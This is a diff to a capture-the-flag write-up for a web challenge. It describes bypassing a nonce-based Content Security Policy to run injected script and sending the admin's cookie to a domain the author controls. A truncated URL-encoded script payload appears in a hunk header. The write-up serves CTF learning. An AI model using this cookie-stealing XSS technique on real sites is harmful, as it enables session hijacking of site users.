@@ -11,9 +11,7 @@ When testing for an XSS with the usual
 
 XSS payload, I see that it is loaded into the page but the script doesn't function. Opening up devtools gives us the following CSP error:
 
-```
-once-web.2024-bq.ctfcompetition.com/:47 Refused to execute inline script because it violates the following Content Security Policy directive: "script-src 'self' 'nonce-bO4ppxGUAjltHc4UXpjG6ggg'". Either the 'unsafe-inline' keyword, a hash ('sha256-S8S/VNmXuUuoIR6OhqBqwIiIkuCxXq31hCCHAHnicV8='), or a nonce ('nonce-...') is required to enable inline execution.
-```
+![csp](https://github.com/user-attachments/assets/da97b2b2-8106-45d4-9d5b-8a0908cabf5a)
 
 Nonce is like a key that must be presented in order for script to be run inline.
 
@@ -25,7 +23,8 @@ To bypass this, we just have to include the nonce value in the payload:
 
 Success:
 
----
+![alert](https://github.com/user-attachments/assets/afea90bc-e4cf-4225-80da-28c264ea8be0)
+
 
 From here, the cookies for the admin seem like the logical place for the flag so I create a new payload that will fetch a domain under my control with the cookie included as part of the request. The payload to first add into the "name" parameter:
 
@@ -41,7 +40,8 @@ https://once-web.2024-bq.ctfcompetition.com/?name=%3Cscript+nonce%3DbO4ppxGUAjlt
 
 And the result from a python listener:
 
----
+![flag](https://github.com/user-attachments/assets/d184eed2-a939-4290-9657-497b3da4676b)
+
 
 # Resources/Learning
 
